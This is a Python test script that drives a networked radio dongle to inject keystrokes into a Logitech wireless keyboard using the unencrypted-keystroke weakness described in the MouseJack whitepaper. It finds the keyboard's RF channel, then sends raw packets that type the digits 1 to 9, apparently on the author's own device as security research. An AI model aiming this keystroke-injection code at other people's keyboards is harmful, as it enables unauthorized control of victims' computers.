'''
Testing Client-Server communication. The server sends live commands over the network to a possibly remote agent computer,
in order to inject 123456789 to a victim. This way, only the agent is required to be physically close to the victim,
and it directly operates the USB attacking dongle based on the server's commands.
'''

import time
import sys
from os.path import dirname

sys.path.append(dirname(dirname(__file__)))
from main_app.radio_server import * # now the server is imported rather than the agent
from utils.general_utils import *
from utils.hid_scan_codes import *

def main():
    address = [0xB4, 0xB8, 0xAE, 0xED, 0xE4] # RF address of a Logitech MK345 keyboard that I (Ron) own

    # initialize the radio server
    radio_server = RadioServer("0.0.0.0", 5000) # 0.0.0.0 means listen on all network interfaces, this way we don't need to change the IP in this line every time we run the server on a different computer

    # find the frequency channel
    _ = find_address_channel(radio=radio_server, address=address)

    hid_scan_codes_1_to_9 = [KEY_1, KEY_2, KEY_3, KEY_4, KEY_5, KEY_6, KEY_7, KEY_8, KEY_9]

    # transmitting payload that sets the keepalive timeout to 1200ms (=0x4B0)
    radio_server.transmit_payload(SET_KEEPALIVE_TIMEOUT_PAYLOAD)
    time.sleep(SLEEPING_PERIOD) # sleeping for 12ms

    # transmitting '1' to '9'
    for key in hid_scan_codes_1_to_9:
        # refer to Table 8 in the MouseJack whitepaper: Logitech Unencrypted Keystroke Payload
        radio_server.transmit_payload(with_checksum([0x00, 0xC1, 0x00, key, 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
        time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
        radio_server.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke
    # at the end, transmitting a key release packet (scan code = 0x00), otherwise it would keep typing '9' forever
    radio_server.transmit_payload(with_checksum([0x00, 0xC1, 0x00, KEY_RELEASE, 0x00, 0x00, 0x00, 0x00, 0x00]))

if __name__ == "__main__":
    main()
